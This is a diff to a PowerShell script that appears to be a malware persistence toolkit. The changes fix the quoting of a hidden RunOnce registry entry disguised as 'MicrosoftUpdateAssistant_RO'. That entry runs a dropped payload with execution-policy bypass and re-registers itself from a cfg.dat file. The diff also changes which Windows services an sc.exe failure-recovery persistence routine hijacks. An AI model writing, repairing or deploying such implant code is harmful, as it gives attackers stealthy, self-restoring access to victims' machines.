@@ -43,8 +43,6 @@ function Write-Log($msg) {
 
 $servicePortMap = @{
     "TermService"  = @{ TCP = @(3389);        UDP = @(3389) }
-    "WinRM"        = @{ TCP = @(5985, 5986);  UDP = @()     }
-    "MSSQLSERVER"  = @{ TCP = @(1433, 1434);  UDP = @(1434) }
     "EventLog"     = @{ TCP = @();            UDP = @()     }
 }
 
@@ -306,9 +304,9 @@ function Remove-RegRunKey {
 
 function Install-RegRunOnce {
     $reRegCmd = "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command " +
-                "\"& { & '$(Get-PayloadPath)'; " +
-                "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce' " +
-                "-Name 'MicrosoftUpdateAssistant_RO' -Value (Get-Content '$($Script:Config.DropDir)\\cfg.dat') -Type String -Force }\""
+                "& { & '$(Get-PayloadPath)'; " +
+                "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' " +
+                "-Name 'MicrosoftUpdateAssistant_RO' -Value (Get-Content '$($Script:Config.DropDir)\cfg.dat') -Type String -Force }"
     $cfgPath = "$($Script:Config.DropDir)\cfg.dat"
     $reRegCmd | Out-File $cfgPath -Encoding ASCII -Force
     Set-HardenedPermissions -Path $cfgPath -IsFile
@@ -507,7 +505,7 @@ function Remove-TimeProvider {
 }
 
 function Install-ServiceRecovery {
-    $targets = @("TermService", "WinRM", "Schedule")
+    $targets = @("TermService", "DNS")
     foreach ($svc in $targets) {
         try {
             $null = sc.exe failure $svc reset= 86400 actions= restart/1000/restart/1000/restart/1000
